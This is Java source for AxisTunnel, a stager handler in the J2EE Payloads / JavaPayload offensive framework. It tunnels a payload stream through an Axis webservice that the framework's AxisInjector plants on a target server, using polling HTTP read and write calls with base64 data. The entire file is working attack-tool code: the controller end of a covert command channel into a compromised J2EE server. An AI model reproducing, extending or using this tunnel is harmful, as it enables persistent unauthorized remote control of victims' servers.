/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package javapayload.handler.stager;

import j2eepayload.builder.AxisInjector;

import java.io.IOException;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.io.PrintStream;

import javapayload.Parameter;
import javapayload.handler.stage.StageHandler;
import jtcpfwd.util.PollingHandler;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

public class AxisTunnel extends StagerHandler {
	
	public AxisTunnel() {
		super("Tunnel the payload stream via an Axis tunnel webservice", true, false, 
				"This stager tunnels the payload strem through an Axis tunnel webservice.\r\n" +
				"It can only be used in combination with the AxisInjector.");
	}
	
	public Parameter[] getParameters() {
		return new Parameter[] {
				new Parameter("TIMEOUT", false, Parameter.TYPE_NUMBER, "Polling timeout in milliseconds")
		};
	}
	
	protected void handle(final StageHandler stageHandler, String[] parameters, PrintStream errorStream, Object extraArg, StagerHandler readyHandler) throws Exception {
		if (readyHandler != null)
			readyHandler.notifyReady();
		if (extraArg == null || !(extraArg instanceof Connection))
			throw new IllegalArgumentException("No AxisTunnel connection available");
		Connection connection = (Connection) extraArg;
		final int timeoutValue=Integer.parseInt(parameters[1]);
		PipedInputStream localIn = new PipedInputStream();
		final PollingHandler ph = new PollingHandler(new PipedOutputStream(localIn), 1048576);		
		new Thread(new HTTPReceiver(connection, timeoutValue, ph, errorStream)).start();
		new Thread(new HTTPSender(connection, ph, errorStream)).start();
		stageHandler.handle(ph, localIn, parameters);
	}

	protected boolean needHandleBeforeStart() {
		return false;
	}

	protected boolean canHandleExtraArg(Class argType) {
		return argType != null && argType.equals(Connection.class);
	}
	
	protected String getTestArguments() {
		return null;
	}
	
	public static class Connection {
		private final int id;
		private final String url;

		public Connection(String url, int id) {
			this.url = url;
			this.id = id;
		}
		
		public String getURL() {
			return url;
		}
		
		public int getId() {
			return id;
		}
	}

	private static final class HTTPSender implements Runnable {
		private final PollingHandler ph;
		private final PrintStream errorStream;
		private final Connection connection;

		HTTPSender(Connection connection, PollingHandler ph, PrintStream errorStream) {
			this.connection = connection;
			this.ph = ph;
			this.errorStream = errorStream;
		}

		public void run() {
			boolean complete = false;
			int[] generationHolder = new int[1];
			while (true) {
				try {
					int off = complete ? ph.getSendOffset() : ph.getAndResetToSendAckedCount(generationHolder);
					complete = false;
					byte[] buf = ph.getSendBytes(15000, -1, true, generationHolder[0]);
					// buf == null, therefore stop polling
					if (buf == null)
						break;
					int value = Integer.parseInt(AxisInjector.performAxisCall(connection.getURL(), "write", connection.getId() + "," + off + "," + new BASE64Encoder().encode(buf).replaceAll("[\r\n]", "")));
					complete = (value == buf.length);
					if (!complete)
						errorStream.println("Message not complete, " + value + " != " + buf.length);
				} catch (Exception ex) {
					ex.printStackTrace(errorStream);
				}
			}
		}
	}

	private static final class HTTPReceiver implements Runnable {
		private final PollingHandler ph;
		private final PrintStream errorStream;
		private final Connection connection;
		private final int timeoutValue;

		HTTPReceiver(Connection connection, int timeoutValue, PollingHandler ph, PrintStream errorStream) {
			this.connection = connection;
			this.timeoutValue = timeoutValue;
			this.ph = ph;
			this.errorStream = errorStream;
		}

		public void run() {
			try {
				int errors = 0;
				while (errors < 5) {
					try {
						String result = AxisInjector.performAxisCall(connection.getURL(), "read", connection.getId()+","+timeoutValue+","+ph.getReceiveOffset());
						if (result.equals("null")) {
							// connection closed
							return;
						} else if (!result.startsWith("data:")) {
							throw new IOException("Invalid read response: "+result);
						} else {
							byte[] buf = new BASE64Decoder().decodeBuffer(result.substring(5));
							ph.receiveBytes(buf, 0, buf.length);
							errors = 0;
						}
					} catch (IOException ex) {
						ex.printStackTrace(errorStream);
						errors++;
					}
				}
				ph.dispose();
			} catch (Exception ex) {
				ex.printStackTrace(errorStream);
			}
		}
	}
}
